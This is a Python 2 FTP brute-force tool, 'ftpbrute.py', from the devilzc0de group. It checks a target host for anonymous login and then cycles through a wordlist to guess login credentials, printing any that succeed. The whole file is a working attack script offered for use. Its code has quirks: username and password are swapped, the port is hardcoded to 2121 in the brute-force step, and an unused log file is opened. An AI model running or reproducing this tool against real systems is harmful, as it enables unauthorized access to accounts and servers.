#!/usr/bin/env python2

import sys
import time
import os
from ftplib import FTP

if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

log = "ftpbrute.log"
face = 	'''
           .___             .__ .__                  _______       .___                                       				
         __| _/ ____ ___  __|__||  |  ________  ____ \   _  \    __| _/ ____     ____ _______   ____ __  _  __				
        / __ |_/ __ \\\  \/ /|  ||  |  \___   /_/ ___\/  /_\  \  / __ |_/ __ \  _/ ___\\\_  __ \_/ __ \\\ \/ \/ /				
       / /_/ |\  ___/ \   / |  ||  |__ /    / \  \___\  \_/   \/ /_/ |\  ___/  \  \___ |  | \/\  ___/ \     / 				
       \____ | \___  > \_/  |__||____//_____ \ \___  >\_____  /\____ | \___  >  \___  >|__|    \___  > \/\_/  				
            \/     \/                       \/     \/       \/      \/     \/       \/             \/         				
												http://www.devilzc0de.com			
												by : gunslinger_				
ftpbrute.py version 1.0                                     											
Brute forcing ftp target     															
Programmmer : gunslinger_                                    											
gunslinger[at]devilzc0de[dot]com                             											
_____________________________________________________________________________________________________________________________________________ 
'''

option = '''
Usage: ./ftpbrute.py [options]
Options: -t, --target    <hostname/ip>   |   Target to bruteforcing 
         -u, --user      <user>          |   User for bruteforcing
         -w, --wordlist  <filename>      |   Wordlist used for bruteforcing
         -h, --help      <help>          |   print this help
                                        					
Example: ./ftpbrute.py -t 192.168.1.1 -u root -w wordlist.txt

'''

file = open(log, "a")

def MyFace() :
	os.system(SysCls)
	print face


def HelpMe() :
	MyFace()
	print option
	sys.exit(1)

for arg in sys.argv:
	if arg.lower() == '-t' or arg.lower() == '--target':
            hostname = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-u' or arg.lower() == '--user':
            userPassword = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-w' or arg.lower() == '--wordlist':
            wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-h' or arg.lower() == '--help':
        	HelpMe()
	elif len(sys.argv) <= 1:
		HelpMe()
		
def checkanony() : 
	try:
		print "\n[+] Checking for anonymous login\n"
		ftp = FTP(hostname)
		ftp.login()
		ftp.retrlines('LIST')
		print "\n[!] Anonymous login successfuly !\n"
		ftp.quit()
	except Exception, e:
        	print "\n[-] Anonymous login unsuccessful...\n"
		pass
        

def BruteForce(word) :
	sys.stdout.write ("\r[?]Trying : %s " % (word))
	sys.stdout.flush()
     	try:
		ftp = FTP(hostname,2121)
		ftp.login(word, userPassword)
		ftp.retrlines('list')
		ftp.quit()
		print "\n\t[!] Login Success ! "
		print "\t[!] Username : ",word, ""
		print "\t[!] Password : ",userPassword, ""
		print "\t[!] Hostname : ",hostname, ""
		print "\t[!] Log all has been saved to",log,"\n"
		sys.exit(1)
   	except Exception, e:
        	#print "[-] Failed"
		pass
	except KeyboardInterrupt:
		print "\n[-] Aborting...\n"
		sys.exit(1)
	
MyFace()
print "[!] Starting attack at %s" % time.strftime("%X")
print "[!] System Activated for brute forcing..."
print "[!] Please wait until brute forcing finish !\n"
checkanony()	

try:
	preventstrokes = open(wordlist, "r")
	words 	       = preventstrokes.readlines()
	count          = 0 
	while count < len(words): 
		words[count] = words[count].strip() 
		count += 1 
except(IOError): 
  	print "\n[-] Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n[+] Loaded:",len(words),"words"
print "[+] Server :",hostname
print "[+] UserPassword :",userPassword
print "[+] BruteForcing...\n"

for word in words:
	BruteForce(word.replace("\n",""))

file.close()

